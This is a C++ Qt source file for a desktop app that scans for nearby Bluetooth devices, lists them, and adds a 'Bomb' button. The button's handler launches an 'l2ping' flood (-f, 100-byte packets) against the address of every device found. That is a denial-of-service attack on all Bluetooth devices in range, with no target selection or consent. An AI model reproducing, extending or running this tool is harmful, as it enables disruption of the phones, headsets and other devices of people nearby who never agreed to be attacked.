#include "mainwindow.h"
#include "ui_mainwindow.h"

#include <QVBoxLayout>
#include <qdebug.h>
#include <qpushbutton.h>
#include <qscrollarea.h>

#include <bluethooth/devicewidget.h>

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    this->client = new BluethoothClient(this);
    connect(this->client, SIGNAL(finished()), this, SLOT(addDevicesUI()));

    ui->setupUi(this);

    this->client->startDeviceDiscovery();
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::addDevicesUI()
{
    qDebug() << "addDevicesUI";

    QVBoxLayout *mainLayout = new QVBoxLayout(ui->centralwidget);

    QScrollArea *scrollArea = new QScrollArea(this);
    scrollArea->setWidgetResizable(true);

    QWidget *scrollWidget = new QWidget();
    QVBoxLayout *scrollLayout = new QVBoxLayout(scrollWidget);

    QMap<QString, Device> *devices = this->client->getDevices();
    for (auto i = devices->cbegin(), end = devices->cend(); i != end; ++i) {
        DeviceWidget * b = new DeviceWidget();
        b->setName(i.value().getName());
        b->setAddress(i.value().getAddress());
        scrollLayout->addWidget(b);
    }

    QPushButton *btn = new QPushButton();
    btn->setText("Bomb");
    scrollLayout->addWidget(btn);
    connect(btn, SIGNAL(clicked(bool)), this, SLOT(bomb()));


    scrollWidget->setLayout(scrollLayout);
    scrollArea->setWidget(scrollWidget);

    mainLayout->addWidget(scrollArea);
}

void MainWindow::bomb()
{
    QMap<QString, Device> *devices = this->client->getDevices();
    for (auto i = devices->cbegin(), end = devices->cend(); i != end; ++i) {
        qDebug() << "Bomb:" << i.value().getAddress();
        QProcess *process = new QProcess(this);
        process->start("l2ping", QStringList() << "-i" << "hci0" << "-s" << "100" << "-f" << i.value().getAddress());
    }
}
